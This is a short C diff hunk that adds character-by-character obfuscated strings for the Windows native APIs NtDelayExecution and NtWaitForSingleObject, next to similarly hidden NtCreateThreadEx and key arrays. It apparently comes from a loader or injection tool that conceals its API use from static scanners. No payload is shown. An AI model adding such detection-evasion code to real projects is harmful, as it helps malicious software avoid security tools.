@@ -59,6 +59,26 @@ static const unsigned char s_NtCreateThreadEx[] = {
     OBF_CHAR('\0')
 };
 
+static const unsigned char s_NtDelayExecution[] = {
+    OBF_CHAR('N'), OBF_CHAR('t'), OBF_CHAR('D'),
+    OBF_CHAR('e'), OBF_CHAR('l'), OBF_CHAR('a'),
+    OBF_CHAR('y'), OBF_CHAR('E'), OBF_CHAR('x'),
+    OBF_CHAR('e'), OBF_CHAR('c'), OBF_CHAR('u'),
+    OBF_CHAR('t'), OBF_CHAR('i'), OBF_CHAR('o'),
+    OBF_CHAR('n'), OBF_CHAR('\0')
+};
+
+static const unsigned char s_NtWaitForSingleObject[] = {
+    OBF_CHAR('N'), OBF_CHAR('t'), OBF_CHAR('W'),
+    OBF_CHAR('a'), OBF_CHAR('i'), OBF_CHAR('t'),
+    OBF_CHAR('F'), OBF_CHAR('o'), OBF_CHAR('r'),
+    OBF_CHAR('S'), OBF_CHAR('i'), OBF_CHAR('n'),
+    OBF_CHAR('g'), OBF_CHAR('l'), OBF_CHAR('e'),
+    OBF_CHAR('O'), OBF_CHAR('b'), OBF_CHAR('j'),
+    OBF_CHAR('e'), OBF_CHAR('c'), OBF_CHAR('t'),
+    OBF_CHAR('\0')
+};
+
 static const unsigned char s_key[] = {
     OBF_CHAR('h'), OBF_CHAR('o'), OBF_CHAR('n'),
     OBF_CHAR('e'), OBF_CHAR('s'), OBF_CHAR('t'),
